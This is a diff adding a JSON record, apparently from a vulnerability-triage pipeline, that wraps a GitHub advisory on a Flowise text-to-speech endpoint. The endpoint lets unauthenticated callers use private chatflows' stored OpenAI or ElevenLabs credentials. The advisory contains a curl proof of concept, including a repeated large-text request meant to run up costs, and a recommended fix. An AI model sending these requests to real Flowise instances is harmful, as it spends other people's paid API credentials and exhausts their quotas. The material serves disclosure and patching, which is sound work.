@@ -1,0 +1,56 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/114768995?v=4\", \"events_url\": \"https://api.github.com/users/offset/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/offset/followers\", \"following_url\": \"https://api.github.com/users/offset/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/offset/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/offset\", \"id\": 114768995, \"login\": \"offset\", \"node_id\": \"U_kgDOBtc8Yw\", \"organizations_url\": \"https://api.github.com/users/offset/orgs\", \"received_events_url\": \"https://api.github.com/users/offset/received_events\", \"repos_url\": \"https://api.github.com/users/offset/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/offset/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/offset/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/offset\", \"user_view_type\": \"public\"}}], \"cve_id\": null, \"cvss\": {\"score\": null, \"vector_string\": null}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 0.0, \"vector_string\": null}, \"cvss_v4\": {\"score\": 6.3, \"vector_string\": \"CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:L/SC:N/SI:N/SA:N\"}}, \"cwes\": [{\"cwe_id\": \"CWE-862\", \"name\": \"Missing Authorization\"}], \"description\": \"## Summary\\n\\nThe `/api/v1/text-to-speech/generate` endpoint is whitelisted (requires no authentication) and accepts any `chatflowId` without checking whether the referenced chatflow is public. An unauthenticated attacker who knows a valid chatflow UUID can abuse that chatflow's TTS credential (OpenAI or ElevenLabs API key) to generate unlimited text-to-speech audio, incurring costs on the chatflow owner's account.\\n\\n## Details\\n\\nThe TTS `generateTextToSpeech` controller at `packages/server/src/controllers/text-to-speech/index.ts:10-171` is whitelisted at `packages/server/src/utils/constants.ts:41`:\\n\\n```typescript\\n'/api/v1/text-to-speech/generate',\\n```\\n\\nWhen a `chatflowId` is provided and the user is not authenticated (no `req.user`), the controller falls back to fetching the chatflow without workspace scoping:\\n\\n```typescript\\n// packages/server/src/controllers/text-to-speech/index.ts:36-42\\nif (workspaceId) {\\n    chatflow = await chatflowsService.getChatflowById(chatflowId, workspaceId)\\n} else {\\n    // Fallback: get workspaceId from chatflow when req.user.activeWorkspaceId is not set\\n    chatflow = await chatflowsService.getChatflowById(chatflowId)  // NO isPublic check\\n    workspaceId = chatflow.workspaceId\\n}\\n```\\n\\nThe `getChatflowById` function at `packages/server/src/services/chatflows/index.ts:247-272` fetches any chatflow by ID when `workspaceId` is not provided:\\n\\n```typescript\\nconst dbResponse = await appServer.AppDataSource.getRepository(ChatFlow).findOne({\\n    where: {\\n        id: chatflowId,\\n        ...(workspaceId ? { workspaceId } : {})  // No workspace filter when workspaceId is undefined\\n    }\\n})\\n```\\n\\nThe controller then extracts the TTS provider configuration from the chatflow:\\n\\n```typescript\\n// packages/server/src/controllers/text-to-speech/index.ts:51-66\\nconst ttsConfig = JSON.parse(chatflow.textToSpeech)\\nconst activeProviderKey = Object.keys(ttsConfig).find(key => ttsConfig[key].status === true)\\nconst providerConfig = ttsConfig[activeProviderKey]\\nprovider = activeProviderKey\\ncredentialId = providerConfig.credentialId  // Extracted from private chatflow\\n```\\n\\nThis `credentialId` is then used to decrypt and use the stored credential (OpenAI or ElevenLabs API key) to make TTS API calls at `packages/components/src/textToSpeech.ts:33-34`:\\n\\n```typescript\\nconst credentialId = textToSpeechConfig.credentialId as string\\nconst credentialData = await getCredentialData(credentialId ?? '', options)\\n```\\n\\n## PoC\\n\\n```bash\\n# Step 1: Know a chatflow UUID that has TTS enabled (any chatflow, public or private)\\nCHATFLOW_ID=\\\"<any-chatflow-uuid-with-tts-enabled>\\\"\\n\\n# Step 2: Abuse the TTS credential to generate audio without authentication\\ncurl -X POST \\\"http://localhost:3000/api/v1/text-to-speech/generate\\\" \\\\\\n  -H \\\"Content-Type: application/json\\\" \\\\\\n  -d '{\\n    \\\"chatflowId\\\": \\\"'${CHATFLOW_ID}'\\\",\\n    \\\"chatId\\\": \\\"attacker-chat-1\\\",\\n    \\\"chatMessageId\\\": \\\"msg-1\\\",\\n    \\\"text\\\": \\\"This is a test of unauthorized TTS generation using someone elses API key\\\"\\n  }'\\n\\n# Expected: Returns SSE stream with TTS audio data using the chatflow owner's OpenAI/ElevenLabs credentials\\n# event: tts_start\\n# data: {\\\"event\\\":\\\"tts_start\\\",\\\"data\\\":{\\\"chatMessageId\\\":\\\"msg-1\\\",\\\"format\\\":\\\"mp3\\\"}}\\n# event: tts_data\\n# data: {\\\"event\\\":\\\"tts_data\\\",\\\"data\\\":{\\\"chatMessageId\\\":\\\"msg-1\\\",\\\"audioChunk\\\":\\\"<base64-audio>\\\"}}\\n\\n# Step 3: Repeat with large text to incur costs\\ncurl -X POST \\\"http://localhost:3000/api/v1/text-to-speech/generate\\\" \\\\\\n  -H \\\"Content-Type: application/json\\\" \\\\\\n  -d '{\\n    \\\"chatflowId\\\": \\\"'${CHATFLOW_ID}'\\\",\\n    \\\"chatId\\\": \\\"attacker-chat-2\\\",\\n    \\\"chatMessageId\\\": \\\"msg-2\\\",\\n    \\\"text\\\": \\\"'$(python3 -c \\\"print('A' * 4096)\\\")'\\\"\\n  }'\\n```\\n\\n## Impact\\n\\n- **Financial Impact**: An attacker can generate unlimited TTS audio using the chatflow owner's OpenAI or ElevenLabs API credentials, incurring potentially significant costs. OpenAI TTS costs ~$15/1M characters; an attacker could generate large volumes of audio.\\n- **Credential Abuse**: The attacker effectively gains indirect access to the stored API credentials without needing to authenticate or have any permissions. The credentials are not directly exposed but are used on behalf of the attacker.\\n- **Denial of Service**: By exhausting the API quota/budget of the credential, the attacker can deny service to legitimate users of the chatflow.\\n- **Affects Private Chatflows**: This vulnerability affects all chatflows with TTS configured, including those explicitly marked as private (`isPublic: false`).\\n\\n## Recommended Fix\\n\\n1. Check `isPublic` before allowing unauthenticated TTS generation:\\n\\n```typescript\\n// packages/server/src/controllers/text-to-speech/index.ts\\nif (chatflowId) {\\n    let chatflow;\\n    let workspaceId = req.user?.activeWorkspaceId;\\n    \\n    if (workspaceId) {\\n        chatflow = await chatflowsService.getChatflowById(chatflowId, workspaceId)\\n    } else {\\n        chatflow = await chatflowsService.getChatflowById(chatflowId)\\n        // Verify the chatflow is public before using its credentials\\n        if (!chatflow.isPublic) {\\n            throw new InternalFlowiseError(\\n                StatusCodes.UNAUTHORIZED,\\n                'TTS generation requires authentication for non-public chatflows'\\n            )\\n        }\\n        workspaceId = chatflow.workspaceId\\n    }\\n    // ... rest of the function\\n}\\n```\\n\\n2. Consider applying rate limiting to the TTS endpoint to prevent abuse even for public chatflows.\", \"ghsa_id\": \"GHSA-8gj2-2cvc-6xx7\", \"github_reviewed_at\": \"2026-08-04T19:19:44Z\", \"html_url\": \"https://github.com/advisories/GHSA-8gj2-2cvc-6xx7\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-8gj2-2cvc-6xx7\"}], \"nvd_published_at\": null, \"published_at\": \"2026-08-04T19:19:44Z\", \"references\": [\"https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-8gj2-2cvc-6xx7\", \"https://github.com/FlowiseAI/Flowise/pull/6650\", \"https://github.com/FlowiseAI/Flowise/commit/dbec8f9fd3c42faab49416fe81ff1774a5344cba\", \"https://github.com/FlowiseAI/Flowise/releases/tag/flowise@3.1.4\", \"https://github.com/advisories/GHSA-8gj2-2cvc-6xx7\"], \"repository_advisory_url\": \"https://api.github.com/repos/FlowiseAI/Flowise/security-advisories/GHSA-8gj2-2cvc-6xx7\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/FlowiseAI/Flowise\", \"summary\": \"Flowise: Unauthenticated Credential Abuse via Text-to-Speech Endpoint Allows Unauthorized Use of Private Chatflow TTS Credentials\", \"type\": \"reviewed\", \"updated_at\": \"2026-08-04T19:19:47Z\", \"url\": \"https://api.github.com/advisories/GHSA-8gj2-2cvc-6xx7\", \"vulnerabilities\": [{\"first_patched_version\": \"3.1.4\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"flowise\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 3.1.3\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-8gj2-2cvc-6xx7",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "flowise: <= 3.1.3"
+    ],
+    "authentication_required": false,
+    "cves": [],
+    "cvss_score": 6.3,
+    "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:L/SC:N/SI:N/SA:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "flowise"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-08-04T19:37:52.660803Z",
+  "provenance": {
+    "content_sha256": "b22a0f9e122acdbf7a43680819d09c117acb52355baf9441c5b54e01941a44a9",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-08-04T19:19:44Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-8gj2-2cvc-6xx7",
+  "status": "active",
+  "title": "Flowise: Unauthenticated Credential Abuse via Text-to-Speech Endpoint Allows Unauthorized Use of Private Chatflow TTS Credentials",
+  "updated_at": "2026-08-04T19:19:47Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-8gj2-2cvc-6xx7"
+}
